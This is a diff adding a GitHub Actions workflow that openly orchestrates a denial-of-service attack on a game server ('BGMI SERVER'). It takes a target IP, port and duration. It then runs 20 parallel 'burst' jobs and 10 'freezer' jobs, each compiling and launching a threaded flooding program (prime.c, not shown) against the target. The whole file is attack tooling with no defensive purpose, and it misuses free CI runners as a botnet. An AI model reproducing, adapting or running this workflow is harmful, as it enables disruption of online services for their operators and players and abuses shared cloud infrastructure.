@@ -1,0 +1,49 @@
+name: ⚔️ PRIMEXARMY-STRIKE-v4.3 ⚔️
+
+on:
+  workflow_dispatch:
+    inputs:
+      host:
+        description: 'TARGET IP (BGMI SERVER)'
+        required: true
+      port:
+        description: 'TARGET PORT'
+        required: true
+      time:
+        description: 'DURATION (SEC)'
+        required: true
+        default: '300'
+
+jobs:
+  # PHASE 1: THE BURST (20 PARALLEL NODES)
+  PRIME-STORM-CORE:
+    runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        node: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]
+    steps:
+      - name: 🛰️ INITIALIZING PRIMEXARMY
+        uses: actions/checkout@v3
+
+      - name: 🔥 FIRING PRIME-XARMY (HIGH THREADS)
+        run: |
+          gcc prime.c -o PRIME -lpthread
+          chmod +x PRIME
+          ./PRIME ${{ github.event.inputs.host }} ${{ github.event.inputs.port }} ${{ github.event.inputs.time }} 1000
+
+  # PHASE 2: THE FREEZER (10 SUSTAIN NODES)
+  PRIME-FREEZER:
+    needs: PRIME-STORM-CORE
+    runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        node: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]
+    steps:
+      - name: 🛰️ INITIALIZING PRIMEXARMY
+        uses: actions/checkout@v3
+
+      - name: ❄️ SUSTAINING SERVER FREEZE
+        run: |
+          gcc prime.c -o PRIME -lpthread
+          chmod +x PRIME
+          ./PRIME ${{ github.event.inputs.host }} ${{ github.event.inputs.port }} ${{ github.event.inputs.time }} 800
